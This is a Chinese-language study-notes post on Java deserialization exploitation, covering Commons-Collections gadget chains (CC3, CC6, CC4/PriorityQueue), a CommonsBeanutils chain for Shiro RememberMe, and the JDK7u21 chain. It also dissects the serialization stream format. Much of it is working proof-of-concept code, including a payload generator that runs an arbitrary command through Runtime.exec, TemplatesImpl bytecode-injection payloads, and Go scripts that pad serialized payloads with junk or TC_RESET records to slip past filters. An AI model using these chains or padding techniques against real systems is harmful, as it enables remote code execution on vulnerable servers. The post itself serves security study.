# JAVA安全漫谈

> 阅读p神的java安全有感，在这里进行分享

## 1. CC6

> Map.readobject()可以触发map的key的hashcode方法。
>
> CC6的改进就是找到一个类可以去调用LazyMap#get的方法，在TiedMapEntry#hashcode中成功找到。

![image-20220329211746279](C:\Users\MSI\AppData\Roaming\Typora\typora-user-images\image-20220329211746279.png)

![image-20220329211759298](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220329211759298.png)

![image-20220329211823113](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220329211823113.png)

## 2. java中动态加载字节码的那些方法

一个Loader加载类的过程

- loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机 制），在前面没有找到的情况下，执行 findClass 
- findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在 本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass 
- defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类

> java字节码：就是java虚拟机使用的一类指令存储在class文件中，使用其他语言编写代码，只要最后可以编译成.class文件都可以在jvm中运行。
>
> 所以我们如果可以直接将code送到defineclass中，就可以加载了。

`UrlClassLoader`：

```java
URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("http://127.0.0.1/")});
Class<?> helloWorld = urlClassLoader.loadClass("HelloWorld");
helloWorld.newInstance();
```

`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`：

一个内部类`TransletClassLoader`:

![image-20220330203837297](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220330203837297.png)

但是在加载的时候，这个类是有限制的，` com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`,这个字节码必须是他的子类

![image-20220330205935505](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220330205935505.png)

`BCEL`

```java
package com.bytecode;

//import com.sun.org.apache.bcel.internal.classfile.JavaClass;
//import com.sun.org.apache.bcel.internal.classfile.Utility;
//import com.sun.org.apache.bcel.internal.Repository;
// import com.sun.org.apache.bcel.internal.util.ClassLoader;

public class HelloBCEL {
    public static void main(String[] args) {
        // 8u251的更新之后 就没有了
        System.out.println("且用且珍惜");
    }
//    public static void main(String []args) throws Exception {
//        // encode();
//        decode();
//    }
//
//    protected static void encode() throws Exception {
//        JavaClass cls = Repository.lookupClass(evil.Hello.class);
//        String code = Utility.encode(cls.getBytes(), true);
//        System.out.println(code);
//    }
//
//    protected static void decode() throws Exception {
//        // new ClassLoader().loadClass("$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmP$cbN$CA$Q$ac$91$c7$$$cb$w$I$e2$fby0$B$P$ee$c5$h$c4$8b$89$f1$b0Q$T$M$9e$87e$82C$86$j$b3$M$q$7e$96$k4$f1$e0$H$f8Q$c6$9e$91$f8H$ecCW$ba$aa$ba$d23$ef$l$afo$AN$b0$X$a0$88$e5$Sj$a8$fbX$J$d0$c0$aa$875$P$eb$M$c5$8eL$a59e$c85$5b$3d$86$fc$99$k$I$86J$ySq9$j$f7Ev$c3$fb$8a$98Z$ac$T$aez$3c$93v$9e$93ys$t$t$Ma$yfRE$XB$v$ddf$f0$3b$89$9a$87$G$5d$3d$cd$Sq$$$ad$3bp$86$e3$R$9f$f1$Q$k$7c$P$h$n6$b1$c5Pv$ca$fe$ad$ce$d4$c0$c3v$88$j$ec$92$ff$t$95$a1j$d7$o$c5$d3at$d5$l$89$c4$fc$a1$ba$P$T$p$c6$f4$I$3d$r$a1$R$3bE$ea$e8$3a$93$a9$e9$9aL$f01$jV$ff$87f$f0$ee$ed$a4R$dak$c6$bf$o$N$d1$c3v$ab$87$D$U$e8$fbl$z$80$d9$c3$a9$97h$8a$I$Za$e1$e8$F$ec$d1$c9$B$f5$a2$ps$uS$P$bf$M$84$8b$84$3e$96$be$97$P$c9m$ab$f4$84$85Z$ee$Zy$h$c0$5c$40$e0$a4$CYmT$c5$FW$3f$B$dc$ab$c0$7f$cc$B$A$A").newInstance();
//    }
}
```

## 3. CC3的诞生

SerialKiller是⼀个Java反序列化过滤器，可以通过⿊名单与⽩名单的⽅式来限制反序列化时允许通过的 类。

![image-20220331201735045](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220331201735045.png)

然后+`InstantiateTransformer`也是⼀个实现了Transformer接⼝的类，他的作⽤就是调⽤构造⽅法。下面来开始构建poc

```java
package com.gulvn;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.xalan.xsltc.trax.TemplatesImpl;
import org.apache.xalan.xsltc.trax.TrAXFilter;
import org.apache.xalan.xsltc.trax.TransformerFactoryImpl;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

import static com.util.Reflections.setFieldValue;

public class CommonsCollectionsIntro3 {

    public static void main(String[] args) throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=");
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

//        ChainedTransformer newTransformer = new ChainedTransformer(new Transformer[]{
//                new ConstantTransformer(obj),
//                new InvokerTransformer("newTransformer", null, null)
//        });
        ChainedTransformer newTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{obj})
        });
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap,newTransformer);
        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
        Map expMap = new HashMap();
        expMap.put(tme,"value");
        outerMap.remove("keykey");

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        System.out.println(barr.toString());

        ObjectInputStream ois = new ObjectInputStream(new
                ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
//        Map outerMap = TransformedMap.decorate(hashMap, null,
//                newTransformer);
//        outerMap.put("test", "xxxx");
//        new TrAXFilter()
    }
}

```

## 4. CC在shiro中的运用

> [www.rai4over.cn](http://www.rai4over.cn/2020/Shiro-1-2-4-RememberMe反序列化漏洞分析-CVE-2016-4437/)
>
> [Orange: Pwn a CTF Platform with Java JRMP Gadget](http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html)
>
> [Java反序列化利用链分析之Shiro反序列化 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/192619)
>
> [强网杯“彩蛋”——Shiro 1.2.4(SHIRO-550)漏洞之发散性思考 - zsx's Blog (zsxsoft.com)](https://blog.zsxsoft.com/post/35)
>
> `大量Tomcat对类加载`:如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误；forName0

![image-20220401131811034](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220401131811034.png)

这个就是当tomcat和shiro在一起的时候会碰到的那个反序列化的问题，于是我们开始着手解决这个问题。关键在于

```java
Transformer[] transformers = new Transformer[]{
new ConstantTransformer(obj),
new InvokerTransformer("newTransformer", null, null)
};
```

这里使用了一个Transformer的数组，很明显是不行的，所以我们开始使用新的姿势，这里面的`ConstantTransformer`,我们要明白他把引入进来的意义在于：把obj带入到InvokerTransformer.transformer(obj),但是我们在上面的`TideMap`,在触发的时候会将key带入其中，所以这里就比较有意思了。

```java
Map innerMap = new HashMap();
Map outerMap = LazyMap.decorate(innerMap, transformer);
TiedMapEntry tme = new TiedMapEntry(outerMap, obj);
Map expMap = new HashMap();
expMap.put(tme, "valuevalue");
outerMap.clear();
```

这里这个问题解决，我们来记录一下用`idea`调试`tomcat`.首先还原一下报错

![image-20220427111621041](https://c.img.dasctf.com/images/2022427/1651029390102-45f06580-1fc7-4e0c-a921-e50d73dbb346.png)

不难发现他们都有一个共同的特点就是`[L`,这是一个数组，也就对应上了上面所说的部分。我们进去到最后一个报错的`Stream.java`中发现了，是她报错的`[L`,我们继续追踪发现这个类的`resolveClass`重写了，

```
 return ClassUtils.forName(osc.getName());
 ===》
 classloader.loadClass()
```

而原生的

```
class.forName()
```

![image-20220427112436022](https://c.img.dasctf.com/images/2022427/1651029876867-70309b1d-531e-4f05-9046-034d6045dbf5.png)

可以看到这个说法是正确的不能支持`[`,也就不说了。现在就按照上面的步骤来修改。

### solve

因为上面不能使用数组，所以我们先来缩短数组然后再找到好的类对他进行一个一个的替换

```
ChainedTransformer newTransformer = new ChainedTransformer(new Transformer[]{
//                new ConstantTransformer(obj),
//                new InvokerTransformer("newTransformer", null, null)
//        });
```

可以看到，这里的触发流程是`InvokerTransformer.transformer(ConstantTransformer.transformer())`,这一段的含义就是这个，所以如果我们直接形成

`InvokerTransformer.transformer(参数)`，不就可以了吗？

![image-20220427113238665](https://c.img.dasctf.com/images/2022427/1651030366634-ee41ba77-b370-4f85-8413-a752a90e532b.png)

这里我们可以知道`LazyMap`在传递参数的时候会把key传进去。于是就可以利用起来了。

## 5. commons-collections4与漏洞修复

原因就是官方升级了白，但是把CC6直接拷贝过来看看

![image-20220427193728746](https://c.img.dasctf.com/images/2022427/1651059458186-1d0c1429-f1c8-4bb0-a505-783dd1290544.png)

那我们要明白这个类是干嘛的，再能找到替代的

![image-20220427193755216](https://c.img.dasctf.com/images/2022427/1651059475894-f1b81dc3-c522-4ffa-b401-245516d4492c.png)

发现就是一个构造函数，那我们直接调用是不是一样的呢？发现还是可以实现的。CC1,3和6都可以在CC4中正常的使用呢。当然肯定室友

### PriorityQueue利⽤链

在commons-collections中找Gadget的过程，实际上可以简化为，找⼀条从`Serializable#readObject()` ⽅法到 `Transformer#transform()` ⽅法的调⽤链。

然后我们来`PriorityQueue`利用链,关键类

- `java.util.PriorityQueue`
- `org.apache.commons.collections4.comparators.TransformingComparator`

下面看一下关键代码

![image-20220427200059805](https://c.img.dasctf.com/images/2022427/1651060865384-8d6476d0-eb07-4c0b-85d1-0f1904cbc0ae.png)

跟进去`heapify()`

![image-20220427200401562](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220427200401562.png)

继续跟进!

![image-20220427200428138](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220427200428138.png)

可以看到整个Comparator好像和我们之前那个有一点点像

![image-20220427200505588](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220427200505588.png)

所以这个链子就完全闭合了哦。但是我们如果从开发者角度去思考这两个类到底是进行了怎样的实现的话，建议直接看p神的。[PriorityQueue源码分析 - linghu_java - 博客园 (cnblogs.com)](https://www.cnblogs.com/linghu-java/p/9467805.html)

现在开始写poc

```java
package com.gulvn;

import com.bytecode.exampleTemplates;
import javassist.ClassPool;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.xalan.xsltc.trax.TemplatesImpl;
import org.apache.xalan.xsltc.trax.TransformerFactoryImpl;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.HashMap;
import java.util.Map;
import java.util.PriorityQueue;

import static com.bytecode.HelloTemplatesImpl.genByteCode;
import static com.util.Reflections.setFieldValue;
import static org.apache.commons.collections4.map.LazyMap.lazyMap;


public class CommonsCollections4_1 {
    public byte[] getPayload(String cmd) throws Exception{
        //虚假的 为了避免生成payload的时候 弹出两次calc
        Transformer[] fakeTransformers = {new ConstantTransformer(1)};
        //真正触发命令执行的链子
        Transformer[] transformer = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new String[]{cmd}),
                new ConstantTransformer(1),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);
        Map innerMap = new HashMap();
        Map outerMap = lazyMap(innerMap,chainedTransformer);
        //构建hashmap 完成
        //为了触发TiedMapEntry#hashCode()
        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
        Map expMap = new HashMap();
        expMap.put(tme,"value");
        outerMap.remove("keykey");
        //现在吧transformer放回来
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(chainedTransformer, transformer);
        //生成反序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();
        return barr.toByteArray();
    }

    public byte[] genPriorityQueue(String cmd) throws  Exception{
//        java.util.PriorityQueue
        //虚假的 为了避免生成payload的时候 弹出两次calc
        Transformer[] fakeTransformers = {new ConstantTransformer(1)};
        //真正触发命令执行的链子
        Transformer[] transformer = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new String[]{cmd}),
                new ConstantTransformer(1),
        };
        Transformer chainedTransformer = new ChainedTransformer(fakeTransformers);
        Comparator comparator = new TransformingComparator(chainedTransformer);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(2);
        setFieldValue(chainedTransformer, "iTransformers", transformer);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        return barr.toByteArray();
    }

    public byte[] genTemplate(String cmd) throws Exception{
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {ClassPool.getDefault().getCtClass(exampleTemplates.class.getName()).toBytecode()});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
//        我们知道 TemplatesImpl toString(ROME) ,get方法可以触发
        InvokerTransformer transformer = new InvokerTransformer("toString", null, null);
        Comparator comparator = new TransformingComparator(transformer);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(obj);
        queue.add(obj);
        setFieldValue(transformer, "iMethodName", "newTransformer");
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        return barr.toByteArray();
    }
    public static void main(String[] args) throws Exception {
        byte[] payloads = new CommonsCollections4_1().genTemplate("calc");
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(payloads));
        ois.readObject();
    }
}

```

### 官方修复

`PriorityQueue`利⽤链必须在CC4中使用，多得不说，懂得都懂。(主要是`TransformingComparator`)。

我们看看CC3.2.2和CC4.1对于这些反序列化问题的修复

一个是CHECK,一个是直接不再是先serializable接口了呜呜。

## 6. CommonsBeanutils与无CC的shiro反序列化利用

因为这是紧接着上一节课来的，`PriorityQueue`是肯定要用的，所以需要找到一个Comparator接口的。

### CommonsBeanutils介绍

`PropertyUtils.getProperty(new Cat(), "name");`,这个代码会自动找到Cat类的`getName`方法除此之外， `PropertyUtils.getProperty` 还支持递归获取属性，比如a对象中有属性b，b对象 中有属性c，我们可以通过`PropertyUtils.getProperty(a, "b.c");` 的方式进行递归获取。通过这个 方法，使用者可以很方便地调用任意对象的getter，适用于在不确定JavaBean是哪个类对象时使用。他里面还有调用setter，拷贝属性等

### getter的妙用

既然说了要找，当然就找到了`org.apache.commons.beanutils.BeanComparator`,

```java
public int compare(Object o1, Object o2) {
        if (this.property == null) {
            return this.comparator.compare(o1, o2);
        } else {
            try {
                Object value1 = PropertyUtils.getProperty(o1, this.property);
                Object value2 = PropertyUtils.getProperty(o2, this.property);
                return this.comparator.compare(value1, value2);
            } catch (IllegalAccessException var5) {
                throw new RuntimeException("IllegalAccessException: " + var5.toString());
            } catch (InvocationTargetException var6) {
                throw new RuntimeException("InvocationTargetException: " + var6.toString());
            } catch (NoSuchMethodException var7) {
                throw new RuntimeException("NoSuchMethodException: " + var7.toString());
            }
        }
    }
```

然后我们回想一个`Template的利用`，其中就有`getOutputProperties`,直接就成功了吧。

### shiro中的妙用

shiro中很有可能没有cc但是都有cb这依赖。所以我们试一下直接发送过去。

发现了报错`Caused by: java.lang.ClassNotFoundException: Unable to load ObjectStreamClass [org.apache.commons.collections.comparators.ComparableComparator: static final long serialVersionUID = -291439688585137865L;]: `

于是我开始换版本，换姿势，这一次我一定要赢

`Caused by: org.apache.shiro.util.UnknownClassException: Unable to load class named [org.apache.commons.collections.comparators.ComparableComparator] from the thread context, current, or system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.`然后又报错了，

![image-20220427211856843](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220427211856843.png)

原因就是我们不传递comparator的实现他会默认调用那个玩意。

我们知道CB没有cc中的所有类，所以我们要想办法继续利用。所以我们要换一个类满足下面几个特点

- 实现序列化接口
- 实现comparator接口
- 要有这个类。

然后我们找到一个

`java.lang.Integer cannot be cast to java.lang.String`,报错了，然后改一下`add("1")`,就成功了。

## 7. jdk原生反序列化

> jdk7u21

重点在于` sun.reflect.annotation.AnnotationInvocationHandler`,在CC1和rmi协议中也多次使用到这个类。明天下午和晚上有机会再研究一下`RMI`和`LDAP`

在这个类中

```java
    private Boolean equalsImpl(Object var1) {
        if (var1 == this) {
            return true;
        } else if (!this.type.isInstance(var1)) {
            return false;
        } else {
            Method[] var2 = this.getMemberMethods();
            int var3 = var2.length;

            for(int var4 = 0; var4 < var3; ++var4) {
                Method var5 = var2[var4];
                String var6 = var5.getName();
                Object var7 = this.memberValues.get(var6);
                Object var8 = null;
                AnnotationInvocationHandler var9 = this.asOneOfUs(var1);
                if (var9 != null) {
                    var8 = var9.memberValues.get(var6);
                } else {
                    try {
                        var8 = var5.invoke(var1);
                    } catch (InvocationTargetException var11) {
                        return false;
                    } catch (IllegalAccessException var12) {
                        throw new AssertionError(var12);
                    }
                }

                if (!memberValueEquals(var7, var8)) {
                    return false;
                }
            }

            return true;
        }
    }
```

这个方法是有问题的，现在我们要找方法去触发他。`private`这是一个私有的方法，在invoke中被调用了。然后这个类是一个代理类也就是proxy.

![image-20220427233151694](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220427233151694.png)

所以我们需要找到一个方法，在反序列化时对proxy调用equals方法。

![image-20220427233256434](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220427233256434.png)

一看equal这个名字，我们大概猜到了就是在进行两个对象之间的比较，于是我们进行

- equals 
- compareTo

不由得想到上一节中得COMPOARE,但是他使用的是第二种，所以我们还是考虑`set`.`HashSet`

![image-20220427234626861](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220427234626861.png)

最后代码逻辑来到这一块，也就是找到两个hash的值不一样的，最后才会执行(key.euqal),我们知道的是key应该就是被代理的template.

![image-20220427235129380](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220427235129380.png)

所以最后变成找到`Key.hashcode()===0`,也就是字符串`f5a5a608`

所以最后整条链子如图所示

![image-20220428081545071](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220428081545071.png)

最后整个序列化链子的构造大致如上。触发的过程

- `HashSet#readObject`，在反序列化中开始对两个内部的玩意进行比较调用

  ```java
   int hash = hash(key);
   int i = indexFor(hash, table.length);
  ```

  一个是template,一个就是proxy。template求hash应该是多少就是多少。

- `proxy#hash`

  ```java
   private int hashCodeImpl() {
          int var1 = 0;
          Entry var3;
          for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) {
              var3 = (Entry)var2.next();
          }
          return var1;
      }
  ```

  

可以看到就是取出`memberValues`求hash，当`key.hash()==0`时，`hashCodeImpl.hash`==`membervalues.value.hash`,也就是template.hash,也就会触发相等。

- 在`HashSet#put`中当两个数据的hash相等时，就会触发`key.equals(k)`,也就是set中的值`euqals`,看源码也可以发现hashset的实现就是通过hashmap。
- 最后就是`sun.reflect.annotation.AnnotationInvocationHandler#equalsImpl`,执行`this.type`的数据的所有方法。



## 8. java反序列化协议构造与分析

> https://github.com/phith0n/zkar
>
> https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html
>
> go install github.com/phith0n/zkar@latest

关于序列化格式的官方链接已经放在上面，但是因为时间原因，(04/28晚上)不能通读一遍，五一期间再看，希望我记得，下面就跟着p神的文章大致过一遍。具体请大家参考这是`代码审计`知识星球中Java安全的第十九篇文章。我直接使用里面的实例进行分析

```java
package com.model;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;;

public class User implements Serializable {
    protected String name;
    protected User parent;
    public User(String name)
    {
        this.name = name;
    }
    public void setParent(User parent)
    {
        this.parent = parent;
    }

    public static void main(String[] args) throws Exception {
        User user = new User("Bob");
        user.setParent(new User("Josua"));
        ByteArrayOutputStream byteSteam = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(byteSteam);
        oos.writeObject(user);
        System.out.println(Base64.getEncoder().encodeToString(byteSteam.toByteArray()));

    }
}
```

zkar dump -B 

```java
@Magic - 0xac ed
@Version - 0x00 05
@Contents
  TC_OBJECT - 0x73
    TC_CLASSDESC - 0x72
      @ClassName
        @Length - 14 - 0x00 0e
        @Value - com.model.User - 0x63 6f 6d 2e 6d 6f 64 65 6c 2e 55 73 65 72
      @SerialVersionUID - -856142814132692337 - 0xf4 1e 5e a5 86 9e 1a 8f
      @Handler - 8257536
      @ClassDescFlags - SC_SERIALIZABLE - 0x02
      @FieldCount - 2 - 0x00 02
      []Fields
        Index 0:
          Object - L - 0x4c
          @FieldName
            @Length - 4 - 0x00 04
            @Value - name - 0x6e 61 6d 65
          @ClassName
            TC_STRING - 0x74
              @Handler - 8257537
              @Length - 18 - 0x00 12
              @Value - Ljava/lang/String; - 0x4c 6a 61 76 61 2f 6c 61 6e 67 2f 53 74 72 69 6e 67 3b
        Index 1:
          Object - L - 0x4c
          @FieldName
            @Length - 6 - 0x00 06
            @Value - parent - 0x70 61 72 65 6e 74
          @ClassName
            TC_STRING - 0x74
              @Handler - 8257538
              @Length - 16 - 0x00 10
              @Value - Lcom/model/User; - 0x4c 63 6f 6d 2f 6d 6f 64 65 6c 2f 55 73 65 72 3b
      []ClassAnnotations
        TC_ENDBLOCKDATA - 0x78
      @SuperClassDesc
        TC_NULL - 0x70
    @Handler - 8257539
    []ClassData
      @ClassName - com.model.User
        {}Attributes
          name
            TC_STRING - 0x74
              @Handler - 8257540
              @Length - 3 - 0x00 03
              @Value - Bob - 0x42 6f 62
          parent
            TC_OBJECT - 0x73
              TC_REFERENCE - 0x71
                @Handler - 8257536 - 0x00 7e 00 00
              @Handler - 8257541
              []ClassData
                @ClassName - com.model.User
                  {}Attributes
                    name
                      TC_STRING - 0x74
                        @Handler - 8257542
                        @Length - 5 - 0x00 05
                        @Value - Josua - 0x4a 6f 73 75 61
                    parent
                      TC_NULL - 0x70
```

`@Magic - 0xac ed @Version - 0x00 05`这个是java反序列化字符串的头`0xaced0005`,刚好对应上`stream`.

然后`contents`部分的内容`TC_OBJECT - 0x73`的头，然后是`TC_CLASSDESC`：类描述和`[]ClassData`这是实例的数据。

我们在attributes中发现了

![image-20220428213155390](https://gitee.com/ddem0/typora-pic/raw/master/images/image-20220428213155390.png)

他的`parent`属性是一个TC_ObJECT,同时他的handler和user的一样，正好符合。差不多也就这些东西。我们接着下面看。

序列化的核心部分总结如下

```
stream:
	magic version contents
contents:
	content
	contents content
content:
    object
    blockdata(可以随意填充数据)
object:
    newObject 一个对象
    newClass 表示一个类
    newArray 表示一个数组
    newString 表示一个字符串
    newEnum 表示一个枚举类型
    newClassDesc 表示一个类定义
    prevObject 一个引用，可以指向任意其他类型（通过Reference ID）
    nullReference 表示null
    exception 表示一个异常
    TC_RESET 重置Reference ID
```

其他的可以参考官方文档加深理解。重点在于如何向里面加入辣鸡数据

### 如何构造一个包含垃圾数据的序列化流

> ToDo: https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ

```
content:
    object
    blockdata
blockdata:
    blockdatashort
    blockdatalong
blockdatashort:
	TC_BLOCKDATA (unsigned byte)<size> (byte)[size]
blockdatalong:
	TC_BLOCKDATALONG (int)<size> (byte)[size]
```

所以我们使用p神的工具

```go
package main
import (
	"github.com/phith0n/zkar/serz"
	"io/ioutil"
	"log"
	"strings"
)
func main() {
	data, _ := ioutil.ReadFile("E:\\blog\\study-note\\java安全\\java序列化链\\java安全漫谈\\test.ser")
	serialization, err := serz.FromBytes(data)//读取文件中的序列化数据 为serialization格式
	if err != nil {
		log.Fatal("parse error")
	}
	var blockData = &serz.TCContent{
		Flag: serz.JAVA_TC_BLOCKDATALONG,//blockdatalong
		BlockData: &serz.TCBlockData{
			Data: []byte(strings.Repeat("a", 40000)),
		},
	}//TCContent 就是content类型
	serialization.Contents = append(serialization.Contents, blockData)//在原切片的末尾添加元素
	ioutil.WriteFile("cc6-padding.ser", serialization.ToBytes(), 0o755)
}
```

但是上面这种做法依然存在一个问题就是，ugly数据是存放在object的后面，换句话说就是他只检查前面怎么办。`readObject0`,可以看一下

> 可见，只有在处理 TC_RESET 的时候是一个循环，通过while循环消耗掉所有的 TC_RESET 后就进入了一 个switch选择语句。此时因为我们 contents 里第一个结构是一个 blockdata ，所以会进入 case TC_BLOCKDATALONG 中，而这里面就抛出了异常。 也就是说，Java只会处理 contents 里面除了 TC_RESET 之外的首个结构，而且这个结构不能是 blockdata 、 exception 等。

根据上面这个，我们可以在前面填充`TC_RESET `结构

```go
import (
"github.com/phith0n/zkar/serz"
"io/ioutil"
"log"
)
func main() {
data, _ := ioutil.ReadFile("cc6.ser")
serialization, err := serz.FromBytes(data)
if err != nil {
log.Fatal("parse error")
}
var contents []*serz.TCContent
for i := 0; i < 5000; i++ {
var blockData = &serz.TCContent{
Flag: serz.JAVA_TC_RESET,
}
contents = append(contents, blockData)
}
serialization.Contents = append(contents, serialization.Contents...)
ioutil.WriteFile("cc6-padding.ser", serialization.ToBytes(), 0o755)
}
```

感谢p神的文章 受益匪浅。

